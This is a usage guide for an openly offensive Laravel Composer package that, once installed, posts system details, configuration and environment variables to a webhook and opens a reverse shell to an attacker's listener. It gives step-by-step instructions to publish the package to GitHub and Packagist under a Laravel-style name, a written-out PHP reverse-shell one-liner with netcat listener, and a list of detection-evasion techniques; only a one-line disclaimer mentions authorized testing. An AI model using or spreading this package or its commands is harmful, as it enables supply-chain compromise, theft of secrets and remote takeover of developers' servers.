# Usage Guide - Laravel Malicious Package

## Quick Start

### 1. Configure the Package
Edit `config.php` and update:
```php
'callback' => [
    'url' => 'https://webhook.site/your-actual-webhook-id',
],
'reverse_shell' => [
    'host' => 'your.actual.ip.address',
    'port' => 4444,
],
```

### 2. Set Up Listeners

**Webhook Listener:**
- Go to https://webhook.site
- Copy your unique URL
- Update `config.php` with this URL

**Reverse Shell Listener:**
```bash
# On your attacking machine
nc -lvp 4444
```

### 3. Upload to GitHub and Packagist
```bash
git init
git add .
git commit -m "Initial commit"
git remote add origin https://github.com/yourusername/laravel-malicious-package.git
git push -u origin main
```

**Submit to Packagist:**
1. Go to https://packagist.org
2. Sign in with your GitHub account
3. Click "Submit" and enter your GitHub repository URL
4. Packagist will automatically sync your package

### 4. Test the Package

**Add to target Laravel project's composer.json:**
```json
{
    "require": {
        "laravel/malicious-package": "*"
    }
}
```

**Install the package:**
```bash
composer install
```

### 5. Expected Results

When the Laravel application loads:

1. **HTTP Callback** - You'll receive a POST request at your webhook with:
   - System information (PHP version, OS, etc.)
   - Laravel configuration details
   - Environment variables (sensitive ones redacted)

2. **Reverse Shell** - A connection will be made to your netcat listener providing shell access

3. **Additional Info** - A second callback with detailed file permissions and configuration

## Testing Commands

**Check configuration:**
```bash
./install.sh
```

**Test webhook manually:**
```bash
curl -X POST https://webhook.site/your-id \
  -H "Content-Type: application/json" \
  -d '{"test": "manual connection"}'
```

**Test reverse shell manually:**
```bash
# Start listener
nc -lvp 4444

# Test connection (from target machine)
php -r '$sock=fsockopen("your.ip",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

## Detection Evasion

The package includes several evasion techniques:
- Base64 encoded payloads
- Background execution to avoid blocking
- Silent error handling
- Legitimate-looking package structure
- Laravel auto-discovery integration

## Cleanup

To remove from target system:
```bash
composer remove laravel/malicious-package
```

## Legal Disclaimer

This tool is for authorized penetration testing and security research only. Ensure you have proper authorization before testing on any systems.
